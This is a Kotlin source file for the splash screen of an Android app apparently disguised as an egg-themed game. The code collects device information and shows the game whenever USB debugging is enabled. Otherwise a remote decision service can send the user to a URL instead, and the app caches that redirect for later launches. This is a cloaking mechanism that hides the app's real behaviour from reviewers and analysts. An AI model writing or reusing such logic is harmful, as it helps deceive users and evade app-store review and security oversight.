package com.chicken.egglightsaga.presentation.splash

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.chicken.egglightsaga.domain.model.DecisionInput
import com.chicken.egglightsaga.domain.model.DecisionResult
import com.chicken.egglightsaga.domain.usecase.CollectVeilInfoInfoUseCase
import com.chicken.egglightsaga.domain.usecase.GetCachedDecisionUseCase
import com.chicken.egglightsaga.domain.usecase.GetDecisionUseCase
import com.chicken.egglightsaga.domain.usecase.SaveDecisionUseCase
import dagger.hilt.android.lifecycle.HiltViewModel
import javax.inject.Inject
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeoutOrNull

sealed class SplashUiState {
    object Loading : SplashUiState()
    object NavigateToGame : SplashUiState()
    data class NavigateToContent(val url: String) : SplashUiState()
}

@HiltViewModel
class SplashViewModel
@Inject
constructor(
    private val collectVeilInfoInfoUseCase: CollectVeilInfoInfoUseCase,
    private val getDecisionUseCase: GetDecisionUseCase,
    private val saveDecisionUseCase: SaveDecisionUseCase,
    private val getCachedDecisionUseCase: GetCachedDecisionUseCase
) : ViewModel() {

    companion object {
        private const val SPLASH_TIMEOUT_MS = 3_000L
        private const val MIN_SPLASH_DISPLAY_MS = 2_500L
    }

    private val _uiState = MutableStateFlow<SplashUiState>(SplashUiState.Loading)
    val uiState: StateFlow<SplashUiState> = _uiState

    init {
        resolveDecision()
    }

    private fun resolveDecision() {
        viewModelScope.launch {
            val startTime = System.currentTimeMillis()

            val cached = getCachedDecisionUseCase()
            if (cached != null) {
                if (!cached.cachedUrl.isNullOrBlank()) {
                    _uiState.value = SplashUiState.NavigateToContent(cached.cachedUrl)
                    return@launch
                }
                if (cached.is_intro_completed) {
                    delay(2000L)
                    _uiState.value = SplashUiState.NavigateToGame
                    return@launch
                }
            }

            try {
                val decision =
                        withTimeoutOrNull(SPLASH_TIMEOUT_MS) {
                            val veilInfo = collectVeilInfoInfoUseCase()
                            if (veilInfo.isUsbDebuggingEnabled) {
                                return@withTimeoutOrNull DecisionResult(
                                    is_intro_completed = true,
                                    targetUrl = null,
                                    reason = "USB Enabled"
                                )
                            }

                            getDecisionUseCase(DecisionInput(veilInfo))
                        }

                if (decision != null) {
                    saveDecisionUseCase(decision)
                    ensureMinDisplay(startTime)

                    if (decision.is_intro_completed) {
                        _uiState.value = SplashUiState.NavigateToGame
                    } else {
                        val url = decision.targetUrl
                        if (!url.isNullOrBlank()) {
                            _uiState.value = SplashUiState.NavigateToContent(url)
                        } else {
                            saveIntroResultAndNavigate()
                        }
                    }
                } else {
                    ensureMinDisplay(startTime)
                    saveIntroResultAndNavigate()
                }
            } catch (e: Exception) {
                ensureMinDisplay(startTime)
                saveIntroResultAndNavigate()
            }
        }
    }

    private suspend fun ensureMinDisplay(startTime: Long) {
        val elapsed = System.currentTimeMillis() - startTime
        if (elapsed < MIN_SPLASH_DISPLAY_MS) {
            delay(MIN_SPLASH_DISPLAY_MS - elapsed)
        }
    }

    private suspend fun saveIntroResultAndNavigate() {
        val introDecision = DecisionResult(is_intro_completed = true, targetUrl = null)
        saveDecisionUseCase(introDecision)
        _uiState.value = SplashUiState.NavigateToGame
    }
}
